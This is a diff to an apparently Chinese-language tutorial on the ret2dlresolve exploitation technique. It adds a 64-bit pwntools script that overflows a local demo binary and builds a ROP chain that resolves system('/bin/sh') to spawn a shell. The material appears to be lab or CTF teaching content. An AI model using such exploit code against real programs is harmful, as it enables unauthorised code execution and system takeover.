@@ -538,7 +538,7 @@ p.send(b'a' * 120 + csu(write_got, bss_addr + 0x200, 0, 0) + p64(vuln_addr))
 p.interactive()
 ```
 
-#   使用pwntools工具
+# 使用pwntools工具
 以main_partial_relro_32举例
 ```python
 from pwn import *
@@ -554,6 +554,25 @@ rop.read(0, dl.data_addr)
 rop.ret2dlresolve(dl)
 
 p.send(b'a' * 112 + rop.chain())
+p.send(dl.payload)
+
+p.interactive()
+```
+
+64位
+```python
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '80'])
+p	= process("./demo")
+elf	= ELF("./demo")
+rop	= ROP("./demo")
+
+# gdb.attach(p)
+dl = Ret2dlresolvePayload(elf, symbol = "system", args = ["/bin/sh"])
+rop.read(0, dl.data_addr)
+rop.ret2dlresolve(dl)
+
+p.send((b'a' * (4 + 8) + rop.chain()).ljust(0x100, b'\x00'))
 p.send(dl.payload)
 
 p.interactive()
